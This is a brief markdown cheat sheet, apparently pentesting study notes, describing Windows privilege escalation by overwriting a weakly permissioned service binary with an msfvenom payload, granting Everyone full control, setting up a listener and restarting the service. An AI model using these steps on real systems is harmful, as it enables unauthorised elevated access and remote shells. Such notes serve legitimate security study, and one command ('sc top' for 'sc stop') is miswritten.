# Example:

### 1: Query for a service: sc qc SERVICE

#### Services configurations are stored in: HKLM\SYSTEM\CurrentControlSet\Services\

### 2: Check permissions with icacls:

#### If (M) is persent, we can overwrite it with our payload and service will execute with the privileges of the user account.

### 3: msfvenom payload

### 4: Replace original service with payload: 

#### move ORIGINAL ORIGINAL.BKP

#### move /location/of/payload FAKE_SERVICE

### 5: icacls FAKE_SERVICE /grant Everyone:F

### 6: Setup listener

### 7: Restart Service: sc top, then sc start

### *In powershell, use sc.exe to control services
